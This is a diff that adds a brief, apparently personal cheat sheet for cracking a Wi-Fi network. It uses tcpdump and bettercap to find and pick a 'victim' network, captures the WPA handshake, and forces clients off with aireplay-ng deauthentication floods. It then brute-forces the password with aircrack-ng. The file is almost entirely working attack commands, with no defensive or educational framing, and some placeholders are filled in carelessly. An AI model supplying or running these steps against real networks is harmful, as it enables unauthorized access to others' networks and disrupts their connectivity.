@@ -1,0 +1,29 @@
+
+# Print the list of the network interfaces available on the system and on which tcpdump can capture packets.
+tcpdump -D
+
+# Scan traffic
+sudo bettercap -iface en0
+
+# caplet
+wifi.recon on
+set wifi.show.sort clients desc
+set ticker.commands 'clear; wifi.show'
+ticker on
+
+# Choose victim
+CHANNEL=2
+BSSID='NetworkName'
+ESSID=''
+
+# Get Traffic
+sudo tcpdump -I -U -n -vvv -w handshake.cap -i en0
+
+# While Getting Traffic Deaut Victim
+aireplay-ng -1 0 -a $BSSID -h 00:11:22:33:44:55 -e (essid) (interface)
+aireplay-ng -1 0 -a "242E0242B591-2G" -h 00:23:b1:8f:d7:24 en0
+aireplay-ng --deauth 100 -a $BSSID en0
+aireplay-ng -0 10 -a $BSSID -c $ESSID en0
+
+# bruteforce passaword
+aircrack-ng --simd=avx *.cap -w {}
